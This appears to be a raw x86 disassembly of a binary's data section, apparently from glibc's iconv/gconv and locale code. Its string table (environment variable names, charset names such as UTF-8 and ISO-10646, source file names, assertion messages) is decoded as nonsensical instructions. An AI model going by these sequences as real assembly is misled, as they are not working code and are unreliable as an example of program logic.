or byte [esi + 0x60], bh
add eax, 0x5608608
or byte [esi + 0x30080560], cl
pushal
add eax, 0x5609608
or byte [eax + 0x30080560], ah
pushal
add eax, 0x5603008
or byte [eax], dh
pushal
add eax, 0x5603008
or byte [eax], dh
pushal
add eax, 0x560aa08
or byte [eax], dh
pushal
add eax, 0x5603008
or byte [eax], dh
pushal
add eax, 0x5603008
or byte [eax], dh
pushal
add eax, 0x5603008
or byte [eax], dh
pushal
add eax, 0x5603008
or dh, al
pushal
add eax, 0x5f444c08
or byte [esp + eax*2 + 0x5f], cl
push eax
push edx
inc ebp
dec esp
dec edi
inc ecx
inc esp
add byte [esp + eax*2 + 0x5f], cl
dec esp
inc esp
pop edi
inc esp
inc ebp
inc edx
push ebp
inc edi
add byte [esp + eax*2 + 0x5f], cl
dec esp
inc esp
pop edi
push esp
push edx
inc ecx
inc ebx
inc ebp
pop edi
push eax
push edx
inc ebp
dec esp
dec ecx
dec esi
dec ebx
dec ecx
dec esi
inc edi
add byte [esp + eax*2 + 0x5f], cl
dec esp
dec ecx
inc edx
push edx
inc ecx
push edx
pop ecx
pop edi
push eax
inc ecx
push esp
dec eax
add byte [esp + eax*2 + 0x5f], cl
dec esp
inc esp
pop edi
dec edi
push edx
dec ecx
inc edi
dec ecx
dec esi
pop edi
push eax
inc ecx
push esp
dec eax
add byte [esp + eax*2 + 0x5f], cl
dec esp
inc esp
pop edi
inc esp
inc ebp
inc edx
push ebp
inc edi
pop edi
dec edi
push ebp
push esp
push eax
push ebp
push esp
add byte [esp + eax*2 + 0x5f], cl
dec esp
inc esp
pop edi
push eax
push edx
dec edi
inc esi
dec ecx
dec esp
inc ebp
add byte [esp + eax*2 + 0x5f], cl
dec esp
inc esp
pop edi
push ebp
push ebx
inc ebp
pop edi
dec esp
dec edi
inc ecx
inc esp
pop edi
inc edx
dec ecx
inc ecx
push ebx
add byte [edi + 0x43], al
dec edi
dec esi
push esi
pop edi
push eax
inc ecx
push esp
dec eax
add byte [eax + 0x4f], cl
dec eax
dec edi
push ebx
push esp
inc ecx
dec esp
dec ecx
inc ecx
push ebx
inc ebp
push ebx
add byte [edi + ecx*2 + 0x43], cl
dec esp
dec edi
inc ebx
inc ecx
dec esp
inc esp
dec edi
dec ebp
inc ecx
dec ecx
dec esi
add byte [edi + ecx*2 + 0x43], cl
push eax
inc ecx
push esp
dec eax
add byte [ebp + 0x41], cl
dec ebp
inc ecx
dec esp
dec esp
dec edi
inc ebx
pop edi
push esp
push edx
inc ecx
inc ebx
inc ebp
add byte [esi + 0x4c], cl
dec esi
dec esp
push ebx
push eax
inc ecx
push esp
dec eax
add byte [edx + 0x45], dl
push edx
inc ebp
push ebx
dec edi
dec esp
push esi
pop edi
dec eax
dec edi
push ebx
push esp
pop edi
inc ebx
dec edi
dec esi
inc esi
add byte [edx + 0x45], dl
push edx
inc ebp
push ebx
pop edi
dec edi
push eax
push esp
dec ecx
dec edi
dec esi
push ebx
add byte [ebp + ecx*2 + 0x50], dl
push esp
dec ebp
push eax
inc esp
dec ecx
push edx
add byte [edx + ebx*2 + 0x44], dl
dec ecx
push edx
add byte [eax], al
add byte [eax], al
dec esp
inc esp
pop edi
inc ecx
dec edi
push ebp
push esp
pop edi
dec esp
dec ecx
inc edx
push edx
inc ecx
push edx
pop ecx
pop edi
push eax
inc ecx
push esp
dec eax
add byte [esp + eax*2 + 0x5f], cl
dec esp
inc esp
pop edi
inc ecx
dec edi
push ebp
push esp
pop edi
push eax
push edx
inc ebp
dec esp
dec edi
inc ecx
inc esp
add byte [eax], al
das
jbe 0x8093436
jb 0x8093406
je 0x8093446
jo str._var_profile
das
jbe 0x809343f
jb 0x809340f
jo 0x8093454
outsd dx, dword [esi]
imul bp, word [ebp], 0x444c
dec esp
inc esp
pop edi
push edi
inc ecx
push edx
dec esi
add byte [esp + eax*2 + 0x5f], cl
dec esp
inc esp
pop edi
dec esp
dec ecx
inc edx
push edx
inc ecx
push edx
pop ecx
pop edi
push eax
inc ecx
push esp
dec eax
add byte [esp + eax*2 + 0x5f], cl
dec esp
inc esp
pop edi
inc edx
dec ecx
dec esi
inc esp
pop edi
dec esi
dec edi
push edi
add byte [esp + eax*2 + 0x5f], cl
dec esp
inc esp
pop edi
inc edx
dec ecx
dec esi
inc esp
pop edi
dec esi
dec edi
push esp
add byte [esp + eax*2 + 0x5f], cl
dec esp
inc esp
pop edi
inc esp
pop ecx
dec esi
inc ecx
dec ebp
dec ecx
inc ebx
pop edi
push edi
inc ebp
inc ecx
dec ebx
add byte [esp + eax*2 + 0x5f], cl
dec esp
inc esp
pop edi
push eax
push edx
dec edi
inc esi
dec ecx
dec esp
inc ebp
pop edi
dec edi
push ebp
push esp
push eax
push ebp
push esp
add byte [edi], ch
das
je 0x80934a1
das
jae 0x80934b6
imul esp, dword [ebp + ebp + 0x64], 0x67756265
add byte [esp + eax*2 + 0x5f], cl
dec esp
inc esp
pop edi
inc ecx
push ebx
push ebx
push ebp
dec ebp
inc ebp
pop edi
dec ebx
inc ebp
push edx
dec esi
inc ebp
dec esp
add byte [ebp + 0x41], cl
dec ebp
inc ecx
dec esp
dec esp
dec edi
inc ebx
pop edi
inc ebx
dec eax
inc ebp
inc ebx
dec ebx
pop edi
add byte [edi], ch
das
jne 0x80934df
jb 0x809349d
insb byte es:[edi], dx
imul esp, dword [edx + 0x2f], 0x6e6f6367
jbe str.gconv_modules
arpl word [bx + 0x6e], bp
jbe 0x80934ab
insd dword es:[edi], dx
outsd dx, dword [esi]
jne 0x80934ef
jae 0x8093486
jae str.ucs2__INTERNAL
add byte [0x45544e49], bh
cmp eax, 0x45544e49
push edx
dec esi
inc ecx
dec esp
sub eax, 0x7363753e
xor al, 0
cmp eax, 0x34736375
sub eax, 0x544e493e
inc ebp
push edx
dec esi
inc ecx
dec esp
add byte [ebp + 0x43], dl
push ebp
inc ebx
push ebx
sub eax, 0x2f454c34
das
add byte [0x45544e49], bh
cmp eax, 0x45544e49
push edx
dec esi
inc ecx
dec esp
sub eax, 0x7363753e
xor al, 0x6c
add byte gs:[0x34736375], bh
cmp eax, 0x34736375
insb byte es:[edi], dx
sub eax, 0x544e493e
inc ebp
push edx
dec esi
inc ecx
dec esp
add byte [0x45544e49], bh
cmp eax, 0x45544e49
push edx
dec esi
inc ecx
dec esp
sub eax, 0x6674753e
cmp byte [eax], al
cmp eax, 0x38667475
sub eax, 0x544e493e
inc ebp
push edx
dec esi
inc ecx
dec esp
add byte [0x32736375], bh
cmp eax, 0x32736375
sub eax, 0x544e493e
inc ebp
push edx
dec esi
inc ecx
dec esp
add byte [0x45544e49], bh
cmp eax, 0x45544e49
push edx
dec esi
inc ecx
dec esp
sub eax, 0x7363753e
xor al, byte [eax]
cmp eax, 0x69637361
imul ebp, dword [0x544e493e], 0x414e5245
dec esp
add byte [0x45544e49], bh
cmp eax, 0x45544e49
push edx
dec esi
inc ecx
dec esp
sub eax, 0x6373613e
imul ebp, dword [ecx], 0x7363753d
cmp eax, 0x32736375
jb 0x80935a6
jbe 0x80935a8
jb 0x80935b8
sub eax, 0x544e493e
inc ebp
push edx
dec esi
inc ecx
dec esp
add byte [0x45544e49], bh
cmp eax, 0x45544e49
push edx
dec esi
inc ecx
dec esp
sub eax, 0x7363753e
xor dh, byte [edx + 0x65]
jbe 0x80935c9
jb 0x80935d9
add byte gs:[ebp + 0x43], dl
push ebp
inc ebx
push ebx
sub eax, 0x202f2f34
dec ecx
push ebx
dec edi
sub eax, 0x34363031
das
push ebp
inc ebx
push ebx
xor al, 0x2f
add byte [ebp + 0x43], dl
push ebp
inc ebx
push ebx
sub eax, 0x2f454234
das
and byte [ecx + 0x53], cl
dec edi
sub eax, 0x34363031
das
push ebp
inc ebx
push ebx
xor al, 0x2f
add byte [ebx + 0x53], al
inc ebx
push ebx
push ebp
inc ebx
push ebx
xor al, 0x2f
das
and byte [ecx + 0x53], cl
dec edi
sub eax, 0x34363031
das
push ebp
inc ebx
push ebx
xor al, 0x2f
add byte [ecx + 0x53], cl
dec ecx
push ebx
dec edi
sub eax, 0x34363031
das
das
and byte [ecx + 0x53], cl
dec edi
sub eax, 0x34363031
das
push ebp
inc ebx
push ebx
xor al, 0x2f
add byte [edi + 0x53], cl
dec edi
push ebx
inc esi
xor byte [eax], dh
xor byte [ecx], dh
xor byte [ecx], dh
xor byte [edi + ebp], dh
das
and byte [ecx + 0x53], cl
dec edi
sub eax, 0x34363031
das
push ebp
inc ebx
push ebx
xor al, 0x2f
add byte [edi + 0x53], cl
dec edi
push ebx
inc esi
xor byte [eax], dh
xor byte [ecx], dh
xor byte [ecx], dh
xor byte [0x49202f2f], dh
push ebx
dec edi
sub eax, 0x34363031
das
push ebp
inc ebx
push ebx
xor al, 0x2f
add byte [edi + 0x53], cl
dec edi
push ebx
inc esi
xor byte [eax], dh
xor byte [ecx], dh
xor byte [ecx], dh
xor byte [esi], dh
das
das
and byte [ecx + 0x53], cl
dec edi
sub eax, 0x34363031
das
push ebp
inc ebx
push ebx
xor al, 0x2f
add byte [edi + 0x43], dl
push edi
inc ebx
dec eax
inc ecx
push edx
pop edi
push esp
das
das
and byte [ecx + 0x4e], cl
push esp
inc ebp
push edx
dec esi
inc ecx
dec esp
add byte [ebp + 0x54], dl
push ebp
push esp
inc esi
cmp byte [edi], ch
das
and byte [ecx + 0x53], cl
dec edi
sub eax, 0x34363031
das
push ebp
push esp
inc esi
cmp byte [edi], ch
add byte [ebp + 0x54], dl
push ebp
push esp
inc esi
sub eax, 0x202f2f38
dec ecx
push ebx
dec edi
sub eax, 0x34363031
das
push ebp
push esp
inc esi
cmp byte [edi], ch
add byte [ecx + 0x53], cl
dec ecx
push ebx
dec edi
sub eax, 0x312d5249
cmp dword [ebx], esi
das
das
and byte [ecx + 0x53], cl
dec edi
sub eax, 0x34363031
das
push ebp
push esp
inc esi
cmp byte [edi], ch
add byte [edi + 0x53], cl
dec edi
push ebx
inc esi
xor byte [0x30303130], dh
xor byte [ecx], dh
das
das
and byte [ecx + 0x53], cl
dec edi
sub eax, 0x34363031
das
push ebp
push esp
inc esi
cmp byte [edi], ch
add byte [ebp + 0x43], dl
push ebp
inc ebx
push ebx
xor ch, byte [edi]
das
and byte [ecx + 0x53], cl
dec edi
sub eax, 0x34363031
das
push ebp
inc ebx
push ebx
xor ch, byte [edi]
add byte [ebp + 0x43], dl
push ebp
inc ebx
push ebx
sub eax, 0x202f2f32
dec ecx
push ebx
dec edi
sub eax, 0x34363031
das
push ebp
inc ebx
push ebx
xor ch, byte [edi]
add byte [edi + 0x53], cl
dec edi
push ebx
inc esi
xor byte [eax], dh
xor byte [ecx], dh
xor byte [ecx], dh
xor byte [eax], dh
das
das
and byte [ecx + 0x53], cl
dec edi
sub eax, 0x34363031
das
push ebp
inc ebx
push ebx
xor ch, byte [edi]
add byte [edi + 0x53], cl
dec edi
push ebx
inc esi
xor byte [eax], dh
xor byte [ecx], dh
xor byte [ecx], dh
xor byte [ecx], dh
das
das
and byte [ecx + 0x53], cl
dec edi
sub eax, 0x34363031
das
push ebp
inc ebx
push ebx
xor ch, byte [edi]
add byte [edi + 0x53], cl
dec edi
push ebx
inc esi
xor byte [eax], dh
xor byte [ecx], dh
xor byte [ecx], dh
xor byte [edx], dh
das
das
and byte [ecx + 0x53], cl
dec edi
sub eax, 0x34363031
das
push ebp
inc ebx
push ebx
xor ch, byte [edi]
add byte [ecx + 0x4e], al
inc ecx
dec esi
push ebx
dec ecx
pop edi
pop eax
xor ebp, dword [esi]
xor al, 0x2f
das
and byte [ecx + 0x4e], al
push ebx
dec ecx
pop edi
pop eax
xor ebp, dword [esi]
xor al, 0x2d
xor dword [ecx], edi
cmp byte ss:[edi], ch
das
add byte [ecx + 0x53], cl
dec ecx
push ebx
dec edi
sub eax, 0x362d5249
das
das
and byte [ecx + 0x4e], al
push ebx
dec ecx
pop edi
pop eax
xor ebp, dword [esi]
xor al, 0x2d
xor dword [ecx], edi
cmp byte ss:[edi], ch
das
add byte [ecx + 0x53], cl
dec ecx
push ebx
dec edi
xor al, 0x36
sub eax, 0x2f2f5355
and byte [ecx + 0x4e], al
push ebx
dec ecx
pop edi
pop eax
xor ebp, dword [esi]
xor al, 0x2d
xor dword [ecx], edi
cmp byte ss:[edi], ch
das
add byte [ebp + 0x53], dl
push ebp
push ebx
sub eax, 0x49435341
dec ecx
das
das
and byte [ecx + 0x4e], al
push ebx
dec ecx
pop edi
pop eax
xor ebp, dword [esi]
xor al, 0x2d
xor dword [ecx], edi
cmp byte ss:[edi], ch
das
add byte [ecx + 0x42], cl
dec ecx
inc edx
dec ebp
xor esi, dword [esi]
aaa
das
das
and byte [ecx + 0x4e], al
push ebx
dec ecx
pop edi
pop eax
xor ebp, dword [esi]
xor al, 0x2d
xor dword [ecx], edi
cmp byte ss:[edi], ch
das
add byte [ebx + 0x50], al
inc ebx
push eax
xor esi, dword [esi]
aaa
das
das
and byte [ecx + 0x4e], al
push ebx
dec ecx
pop edi
pop eax
xor ebp, dword [esi]
xor al, 0x2d
xor dword [ecx], edi
cmp byte ss:[edi], ch
das
add byte [ebx + 0x53], al
inc ebx
push ebx
inc ecx
push ebx
inc ebx
dec ecx
dec ecx
das
das
and byte [ecx + 0x4e], al
push ebx
dec ecx
pop edi
pop eax
xor ebp, dword [esi]
xor al, 0x2d
xor dword [ecx], edi
cmp byte ss:[edi], ch
das
add byte [ebp + 0x43], dl
push ebp
inc ebx
push ebx
sub eax, 0x2f454c32
das
and byte [ecx + 0x53], cl
dec edi
sub eax, 0x34363031
das
push ebp
inc ebx
push ebx
xor ch, byte [edi]
add byte [ebp + 0x43], dl
push ebp
inc ebx
push ebx
sub eax, 0x2f454232
das
and byte [ebp + 0x4e], dl
dec ecx
inc ebx
dec edi
inc esp
inc ebp
inc edx
dec ecx
inc edi
das
das
add byte [edx + 0x63], dh
add byte [ebp + 0x6f], ch
insd dword es:[edi], dx
outsd dx, dword [esi]
jne 0x8093894
add byte gs:[ecx + 0x6c], ah
popal
insb byte es:[edi], dx
imul esp, dword [ecx + 0x73], 0x675f5f00
pop edi
pop edi
arpl word [bx + 0x6e], bp
jbe 0x8093897
je 0x809389b
jo 0x809389f
je 0x80938a8
add byte [edi + 0x63], ah
arpl word [bx + 0x6e], bp
jbe 0x80938a6
arpl word [edi + 0x6e], bp
arpl word cs:[eax], ax
arpl word [edi + 0x64], si
and byte [ecx], ah
cmp eax, 0x76282820
outsd dx, dword [esi]
imul esp, dword [eax + 0x2a], 0x293029
insb byte es:[edi], dx
insd dword es:[edi], dx
and byte [ecx], ah
cmp eax, 0x76282820
outsd dx, dword [esi]
imul esp, dword [eax + 0x2a], 0x293029
add byte [eax], al
add byte [ecx], dh
xor dword [eax], esi
xor al, 0x36
sub eax, 0x39313a31
cmp dword [ebx], esi
das
das
and byte [ecx + 0x53], cl
dec edi
sub eax, 0x34363031
das
push ebp
inc ebx
push ebx
xor al, 0x2f
add byte [eax], al
xor dword [eax], esi
xor al, 0x36
sub eax, 0x39313a31
cmp dword [ebx], esi
das
push ebp
inc ebx
push ebx
xor al, 0x2f
and byte [ecx + 0x53], cl
dec edi
sub eax, 0x34363031
das
push ebp
inc ebx
push ebx
xor al, 0x2f
add byte [eax], al
dec ecx
push ebx
dec edi
sub eax, 0x34363031
das
push ebp
push esp
inc esi
sub eax, 0x49202f38
push ebx
dec edi
sub eax, 0x34363031
das
push ebp
push esp
inc esi
cmp byte [edi], ch
add byte [eax], al
add byte [eax], al
inc ecx
dec esi
push ebx
dec ecx
pop edi
pop eax
xor ebp, dword [esi]
xor al, 0x2d
xor dword [ecx], edi
cmp byte [esi], dh
das
das
and byte [ecx + 0x4e], al
push ebx
dec ecx
pop edi
pop eax
xor ebp, dword [esi]
xor al, 0x2d
xor dword [ecx], edi
cmp byte ss:[edi], ch
das
add byte [eax], al
add byte [ecx + 0x53], cl
dec ecx
push ebx
dec edi
pop edi
xor al, 0x36
dec ecx
push edx
push esi
cmp dh, byte [ecx]
cmp dword [ecx], edi
xor dword [edi], ebp
das
and byte [ecx + 0x4e], al
push ebx
dec ecx
pop edi
pop eax
xor ebp, dword [esi]
xor al, 0x2d
xor dword [ecx], edi
cmp byte ss:[edi], ch
das
add byte [edi + 0x53], cl
dec edi
push ebx
inc esi
xor byte [eax], dh
xor byte [ecx], dh
xor byte [eax], dh
xor dh, byte [eax]
das
das
and byte [ecx + 0x4e], al
push ebx
dec ecx
pop edi
pop eax
xor ebp, dword [esi]
xor al, 0x2d
xor dword [ecx], edi
cmp byte ss:[edi], ch
das
add byte [eax], al
push ebp
dec esi
dec ecx
inc ebx
dec edi
inc esp
inc ebp
dec esp
dec ecx
push esp
push esp
dec esp
inc ebp
das
das
and byte [ecx + 0x53], cl
dec edi
sub eax, 0x34363031
das
push ebp
inc ebx
push ebx
xor ch, byte [edi]
add byte [edi + 0x5f], bl
pop edi
pop edi
arpl word [bx + 0x6e], bp
jbe 0x80939cf
je 0x80939d3
bound esi, qword [ebp + 0x69]
insb byte es:[edi], dx
je 0x80939e3
outsb dx, byte [esi]
pop edi
je 0x80939f0
popal
outsb dx, byte [esi]
jae str.gconv_builtin.c
arpl word [bx + 0x6e], bp
jbe 0x80939e7
bound esi, qword [ebp + 0x69]
insb byte es:[edi], dx
je 0x80939f7
outsb dx, byte [esi]
arpl word cs:[eax], ax
add byte [eax], al
arpl word [esi + 0x74], bp
and byte [eax], bh
jae 0x8093a05
jp 0x8093a03
outsd dx, dword [esi]
and byte [eax], ch
insd dword es:[edi], dx
popal
jo 0x80939cf
and byte [edi], ch
and byte [ebx + 0x69], dh
jp 0x8093a12
outsd dx, dword [esi]
and byte [eax], ch
insd dword es:[edi], dx
popal
jo 0x8093a10
xor byte [ebp + 0x29], bl
add byte [eax], al
add byte [eax], al
pop edi
pop edi
arpl word [bx + 0x6e], bp
jbe 0x8093a23
je 0x8093a38
popal
outsb dx, byte [esi]
jae 0x8093a30
outsd dx, dword [esi]
jb 0x8093a3a
pop edi
imul ebp, dword [esi + 0x74], 0x616e7265
insb byte es:[edi], dx
pop edi
jne 0x8093a3c
jae 0x8093a0f
add byte [edi + 0x5f], bl
pop edi
pop edi
arpl word [bx + 0x6e], bp
jbe 0x8093a43
je 0x8093a58
popal
outsb dx, byte [esi]
jae 0x8093a50
outsd dx, dword [esi]
jb 0x8093a5a
pop edi
jne 0x8093a53
jae 0x8093a26
pop edi
imul ebp, dword [esi + 0x74], 0x616e7265
insb byte es:[edi], dx
add byte [edi + 0x5f], bl
pop edi
pop edi
arpl word [bx + 0x6e], bp
jbe 0x8093a63
je 0x8093a78
popal
outsb dx, byte [esi]
jae 0x8093a70
outsd dx, dword [esi]
jb 0x8093a7a
pop edi
imul ebp, dword [esi + 0x74], 0x616e7265
insb byte es:[edi], dx
pop edi
jne 0x8093a7c
jae 0x8093a4f
insb byte es:[edi], dx
add byte gs:[eax], al
add byte [edi + 0x5f], bl
pop edi
pop edi
arpl word [bx + 0x6e], bp
jbe 0x8093a87
je 0x8093a9c
popal
outsb dx, byte [esi]
jae 0x8093a94
outsd dx, dword [esi]
jb 0x8093a9e
pop edi
jne 0x8093a97
jae 0x8093a6a
insb byte es:[edi], dx
pop edi
imul ebp, dword [esi + 0x74], 0x616e7265
insb byte es:[edi], dx
add byte [eax], al
add byte [edi + 0x5f], bl
pop edi
pop edi
arpl word [bx + 0x6e], bp
jbe 0x8093aab
je 0x8093ac0
popal
outsb dx, byte [esi]
jae 0x8093ab8
outsd dx, dword [esi]
jb 0x8093ac2
pop edi
popal
jae 0x8093abc
imul ebp, dword [ecx + 0x5f], 0x65746e69
jb 0x8093ad0
popal
insb byte es:[edi], dx
add byte [eax], al
add byte [eax], al
pop edi
pop edi
arpl word [bx + 0x6e], bp
jbe 0x8093acf
je 0x8093ae4
popal
outsb dx, byte [esi]
jae 0x8093adc
outsd dx, dword [esi]
jb 0x8093ae6
pop edi
imul ebp, dword [esi + 0x74], 0x616e7265
insb byte es:[edi], dx
pop edi
popal
jae 0x8093ae9
imul ebp, dword [ecx], 0x69000000
imul ebp, dword [esi + 0x70], 0x2d207274
and byte [edx + 0x79], ah
je 0x8093afd
bound esi, qword [ebp + 0x66]
and byte [esi], bh
and byte [eax], ch
jae 0x8093b15
popal
je 0x8093b09
sub eax, 0x635f5f3e
outsd dx, dword [esi]
jne 0x8093b1a
je 0x8093ace
and byte es:[edi], dh
sub dword [eax], eax
add byte [edi + 0x5f], bl
pop edi
pop edi
arpl word [bx + 0x6e], bp
jbe 0x8093b1b
je 0x8093b30
popal
outsb dx, byte [esi]
jae 0x8093b28
outsd dx, dword [esi]
jb 0x8093b32
pop edi
imul ebp, dword [esi + 0x74], 0x616e7265
insb byte es:[edi], dx
pop edi
jne 0x8093b45
cmp byte [eax], al
outsb dx, byte [esi]
jae 0x8093b4b
popal
je 0x8093b4f
jae 0x8093afc
cmp eax, 0x5f5f203d
inc edi
inc ebx
dec edi
dec esi
push esi
pop edi
inc esi
push ebp
dec esp
dec esp
pop edi
dec edi
push ebp
push esp
push eax
push ebp
push esp
add byte [eax], al
pop edi
pop edi
arpl word [bx + 0x6e], bp
jbe 0x8093b5b
je 0x8093b70
popal
outsb dx, byte [esi]
jae 0x8093b68
outsd dx, dword [esi]
jb 0x8093b72
pop edi
jne str.ucs2reverse_internal_loop_single
cmp byte [edi + 0x69], bl
outsb dx, byte [esi]
je 0x8093b74
jb 0x8093b7f
popal
insb byte es:[edi], dx
add byte [edi + 0x5f], bl
pop edi
pop edi
arpl word [bx + 0x6e], bp
jbe 0x8093b7b
je 0x8093b90
popal
outsb dx, byte [esi]
jae 0x8093b88
outsd dx, dword [esi]
jb 0x8093b92
pop edi
jne 0x8093b8b
jae 0x8093b5c
pop edi
imul ebp, dword [esi + 0x74], 0x616e7265
insb byte es:[edi], dx
add byte [edi + 0x5f], bl
pop edi
pop edi
arpl word [bx + 0x6e], bp
jbe 0x8093b9b
je 0x8093bb0
popal
outsb dx, byte [esi]
jae 0x8093ba8
outsd dx, dword [esi]
jb 0x8093bb2
pop edi
imul ebp, dword [esi + 0x74], 0x616e7265
insb byte es:[edi], dx
pop edi
jne 0x8093bb4
jae 0x8093b85
add byte [edi + 0x5f], bl
pop edi
pop edi
arpl word [bx + 0x6e], bp
jbe 0x8093bbb
je 0x8093bd0
popal
outsb dx, byte [esi]
jae str.internal_ucs2reverse_loop_single
outsd dx, dword [esi]
jb 0x8093bd2
pop edi
jne 0x8093bcb
jae 0x8093b9c
jb 0x8093bd1
jbe 0x8093bd3
jb 0x8093be3
pop edi
imul ebp, dword [esi + 0x74], 0x616e7265
insb byte es:[edi], dx
add byte [eax], al
jne 0x8093be1
jae 0x8093bb2
jb 0x8093be7
jbe str..._iconv_skeleton.c
jb 0x8093bf9
pop edi
imul ebp, dword [esi + 0x74], 0x616e7265
insb byte es:[edi], dx
pop edi
insb byte es:[edi], dx
outsd dx, dword [esi]
outsd dx, dword [esi]
jo 0x8093bf5
jae 0x8093c01
outsb dx, byte [esi]
insb byte es:[di], dx
add byte gs:[eax], al
add byte [eax], al
pop edi
pop edi
arpl word [bx + 0x6e], bp
jbe 0x8093c07
je 0x8093c1c
popal
outsb dx, byte [esi]
jae 0x8093c14
outsd dx, dword [esi]
jb 0x8093c1e
pop edi
imul ebp, dword [esi + 0x74], 0x616e7265
insb byte es:[edi], dx
pop edi
jne 0x8093c20
jae 0x8093bf1
jb 0x8093c26
jbe 0x8093c28
jb 0x8093c38
add byte gs:[eax], al
imul ebp, dword [esi + 0x74], 0x616e7265
insb byte es:[edi], dx
pop edi
jne 0x8093c36
jae 0x8093c07
jb 0x8093c3c
jbe 0x8093c3e
jb 0x8093c4e
pop edi
insb byte es:[edi], dx
outsd dx, dword [esi]
outsd dx, dword [esi]
jo str.gconv_simple.c
jae 0x8093c4d
outsb dx, byte [esi]
insb byte es:[di], dx
add byte gs:[esi], ch
das
imul esp, dword [ebx + 0x6f], 0x732f766e
imul esp, dword [ebp + 0x6c], 0x65
je 0x8093c68
outsb dx, byte [esi]
arpl word cs:[eax], ax
imul ebp, dword [esi + 0x65], 0x2d20646e
and byte [edx], ch
imul ebp, dword [esi + 0x70], 0x20707274
cmp al, 0x20
xor al, 0
outsd dx, dword [esi]
jne 0x8093c88
bound esi, qword [ebp + 0x66]
jae 0x8093c8d
popal
jb 0x8093c90
and byte [0x2828203d], bh
jbe 0x8093c93
imul esp, dword [eax + 0x2a], 0x293029
jne str.inend___bytebuf_4_
jae 0x8093c64
insb byte es:[edi], dx
pop edi
imul ebp, dword [esi + 0x74], 0x616e7265
insb byte es:[edi], dx
pop edi
insb byte es:[edi], dx
outsd dx, dword [esi]
outsd dx, dword [esi]
jo str.gconv_simple.c
arpl word [bx + 0x6e], bp
jbe str.outbuf__outerr
jae 0x8093cb2
insd dword es:[edi], dx
jo 0x8093cb8
arpl word cs:[eax], ax
sub ch, byte [edi + 0x75]
je 0x8093cc5
je 0x8093cc9
jo 0x8093c79
sub esp, dword [eax]
xor al, 0x20
and byte ds:[edi + 0x75], ch
je 0x8093cc8
outsb dx, byte [esi]
add byte fs:[ecx + 0x6e], ch
imul ebp, dword [esi + 0x74], 0x616e7265
insb byte es:[edi], dx
pop edi
popal
jae 0x8093cd5
imul ebp, dword [ecx + 0x5f], 0x706f6f6c
pop edi
jae 0x8093ce5
outsb dx, byte [esi]
insb byte es:[di], dx
add byte gs:[esi], ch
das
imul esp, dword [ebx + 0x6f], 0x6c2f766e
outsd dx, dword [esi]
outsd dx, dword [esi]
jo 0x8093cbd
arpl word [eax], ax
imul ebp, dword [esi + 0x65], 0x2120646e
cmp eax, 0x79622620
je 0x8093d04
bound esi, qword [ebp + 0x66]
pop ebx
xor al, 0x5d
add byte [edi + 0x75], ch
outsd dx, dword [esi]
jne 0x8093d1d
bound esi, qword [ebp + 0x66]
and byte [0x756f203d], bh
je 0x8093d19
jb 0x8093d28
add byte [ecx + 0x6e], ch
imul ebp, dword [esi + 0x74], 0x616e7265
insb byte es:[edi], dx
pop edi
jne 0x8093d36
cmp byte [edi + 0x6c], bl
outsd dx, dword [esi]
outsd dx, dword [esi]
jo 0x8093d29
jae 0x8093d35
outsb dx, byte [esi]
insb byte es:[di], dx
add byte gs:[ebp + 0x74], dh
jne 0x8093d47
cmp byte [edi + 0x69], bl
outsb dx, byte [esi]
je 0x8093d3f
jb 0x8093d4a
popal
insb byte es:[edi], dx
pop edi
insb byte es:[edi], dx
outsd dx, dword [esi]
outsd dx, dword [esi]
jo 0x8093d43
jae 0x8093d4f
outsb dx, byte [esi]
insb byte es:[di], dx
add byte gs:[ecx + 0x6e], ch
imul ebp, dword [esi + 0x65], 0x2120646e
cmp eax, 0x79622620
je 0x8093d5e
bound esi, qword [ebp + 0x66]
pop ebx
pop ebp
add byte [ebp + 0x63], dh
jne 0x8093d65
jae 0x8093d36
pop edi
imul ebp, dword [esi + 0x74], 0x616e7265
insb byte es:[edi], dx
pop edi
insb byte es:[edi], dx
outsd dx, dword [esi]
outsd dx, dword [esi]
jo 0x8093d72
jae 0x8093d7e
outsb dx, byte [esi]
insb byte es:[di], dx
add byte gs:[ecx + 0x6e], ch
imul ebp, dword [esi + 0x65], 0x2120646e
cmp eax, 0x79622620
je 0x8093d8d
bound esi, qword [ebp + 0x66]
pop ebx
xor bl, byte [ebp]
imul ebp, dword [esi + 0x74], 0x616e7265
insb byte es:[edi], dx
pop edi
jne 0x8093d9d
jae 0x8093d6e
pop edi
insb byte es:[edi], dx
outsd dx, dword [esi]
outsd dx, dword [esi]
jo 0x8093da1
jae 0x8093dad
outsb dx, byte [esi]
insb byte es:[di], dx
add al, al
loopne 0x8093d3c
clc
cld
inc edi
inc ebx
dec edi
dec esi
push esi
pop edi
push eax
inc ecx
push esp
dec eax
add byte [eax], al
add byte [eax], al
das
jne 0x8093dd2
jb 0x8093d90
insb byte es:[edi], dx
imul esp, dword [edx + 0x2f], 0x6e6f6367
jbe 0x8093d9a
arpl word [bx + 0x6e], bp
jbe 0x8093d9e
insd dword es:[edi], dx
outsd dx, dword [esi]
jne 0x8093de2
jae str.gconv_dl.c
arpl word [ecx + 0x63], sp
push 0x63670065
arpl word [bx + 0x6e], bp
jbe 0x8093de4
imul ebp, dword [esi + 0x69], 0x63670074
arpl word [bx + 0x6e], bp
jbe 0x8093def
outsb dx, byte gs:[esi]
add byte fs:[edi + 0x5f], bl
pop edi
pop edi
arpl word [bx + 0x6e], bp
jbe 0x8093dfb
imul bp, word [esi + 0x64], 0x735f
push 0x62696c
arpl word [bx + 0x6e], bp
jbe 0x8093e0c
insb byte es:[edi], dx
arpl word cs:[eax], ax
outsw dx, word [esi]
jne str.LC_MESSAGES
sub eax, 0x6e61683e
insb byte es:[edi], dx
and byte gs:[0x2828203d], bh
jbe 0x8093e36
imul esp, dword [eax + 0x2a], 0x293029
outsd dx, dword fs:[esi]
pop edi
jb 0x8093e39
insb byte es:[edi], dx
popal
jae 0x8093e3e
pop edi
jae 0x8093e44
insb byte es:[edi], dx
imul esp, dword [edx], 0x2d6a626f
outsd dx, dword [esi]
bound ebp, qword [edx + 0x2d]
arpl word ds:[edi + 0x75], bp
outsb dx, byte [esi]
je 0x8093e50
jb str.LC_COLLATE
and byte ds:[eax], dh
add byte [ebx + eax*2 + 0x5f], cl
dec esp
inc ebx
pop edi
inc ebx
push esp
pop ecx
push eax
inc ebp
add byte [ebx + eax*2 + 0x5f], cl
dec esp
inc ebx
pop edi
dec esi
push ebp
dec ebp
inc ebp
push edx
dec ecx
inc ebx
add byte [ebx + eax*2 + 0x5f], cl
dec esp
inc ebx
pop edi
push esp
dec ecx
dec ebp
inc ebp
add byte [ebx + eax*2 + 0x5f], cl
dec esp
inc ebx
